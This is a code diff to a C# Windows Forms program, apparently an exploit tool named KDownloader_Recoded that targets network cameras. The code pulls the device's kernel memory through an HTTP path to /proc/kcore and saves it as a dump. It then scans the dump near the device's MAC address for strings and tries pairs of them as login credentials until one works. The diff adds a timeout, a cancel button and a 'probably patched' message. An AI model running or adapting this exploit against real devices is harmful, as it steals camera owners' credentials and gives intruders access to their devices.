@@ -17,10 +17,13 @@ namespace KDownloader_Recoded
 {
     public partial class kcore : Form
     {
-        public kcore()
+        public kcore(string getNextIp = "")
         {
             InitializeComponent();
         }
+
+        public string returnNextIp { get; set; }
+        public string getNextIp = "";
 
         public List<Byte> memDat = new List<Byte> { };
         public TimeWebClient w = new TimeWebClient();
@@ -28,6 +31,7 @@ namespace KDownloader_Recoded
         public string path = "";
         public Random rnd = new Random();
         public Thread dl;
+        public Thread handler;
         public string fileName = "";
         public string macAddr = "";
         public string username = "";
@@ -35,11 +39,14 @@ namespace KDownloader_Recoded
         public string[] rawSplit;
         public int extCount = 0;
         public int curOffset = 3;
+        bool set = false;
+
         private void btn_attack_Click(object sender, EventArgs e)
         {
             try
             {
                 lb_console.Items.Clear();
+
                 ipAddr = tb_ipaddr.Text;
                 ipAddr = processIP();
                 getMacAddr();
@@ -63,16 +70,23 @@ namespace KDownloader_Recoded
             rndFuncs rn = new rndFuncs();
             string rndFilePref = rn.RandomString(5);
             dl = new Thread(() => {
+                this.BeginInvoke((MethodInvoker)delegate {
+                    btn_attack.Enabled = false;
+                });
                 w.DownloadProgressChanged += new DownloadProgressChangedEventHandler(client_DownloadProgressChanged);
-                w.DownloadFileCompleted += new AsyncCompletedEventHandler(client_DownloadFileCompleted);
+                w.DownloadFileCompleted += new AsyncCompletedEventHandler(client_DownloadFileCompleted);               
                 w.DownloadFileAsync(new Uri(ipAddr + "//proc/kcore"), path + "/" + rndFilePref + "_memory.dmp");
                 fileName = path + "/" + rndFilePref + "_memory.dmp";
             });
+            dl.IsBackground = true;
             dl.Start();
         }
 
         public void client_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
         {
+            failsafeTimer.Stop();
+            failsafeTimer.Start();
+
             this.BeginInvoke((MethodInvoker)delegate {
 
                 print(Color.Black, "Downloading data: " + e.BytesReceived / 1024 + "KB");
@@ -118,6 +132,8 @@ namespace KDownloader_Recoded
 
             List<String> possibleMacAddress = new List<String> { };
 
+            bool found = false;
+
             foreach(string s in rawSplit)
             {
                 if(s == macAddr)
@@ -142,11 +158,11 @@ namespace KDownloader_Recoded
 
                     for(int i = 0; i < strDump.Count() - 1; i++)
                     {
-                        Console.WriteLine("TESTING USER " + strDump[i] + " PASS " + strDump[i + 1]);
                         if (testPossibleCreds(strDump[i], strDump[i + 1]))
                         {
                             username = strDump[i];
                             password = strDump[i + 1];
+                            found = true;
                             announceFoundCreds();
                             break;
                         }
@@ -160,6 +176,12 @@ namespace KDownloader_Recoded
                 }
                 extCount++;
             }
+
+            if (!found)
+            {
+                print(Color.Red, "Nothing found. Probably patched.");
+            }
+
         }
 
         public void announceFoundCreds()
@@ -221,10 +243,13 @@ namespace KDownloader_Recoded
 
         public void print(Color c, string text)
         {
-            this.Invoke(new MethodInvoker(delegate ()
+            if (this.IsHandleCreated)
             {
-                lb_console.Items.Insert(0, new colourItem(c, text));
-            }));
+                this.Invoke(new MethodInvoker(delegate ()
+                {
+                    lb_console.Items.Insert(0, new colourItem(c, text));
+                }));
+            }
         }
 
         public bool testPossibleCreds(string user, string pass)
@@ -271,6 +296,19 @@ namespace KDownloader_Recoded
                     }
                 }
             }
+        }
+
+        private void btn_cut_Click(object sender, EventArgs e)
+        {
+            w.CancelAsync();
+        }
+
+        private void failsafeTimer_Tick(object sender, EventArgs e)
+        {
+            //due to the broken nature of this exploit, the camera can report a large file but only send a small amount of data
+            //if no data is recieved for 5 seconds, we assume the camera has died and end the download process
+            print(Color.Orange, "Download was closed early.");
+            w.CancelAsync();
         }
     }
 }
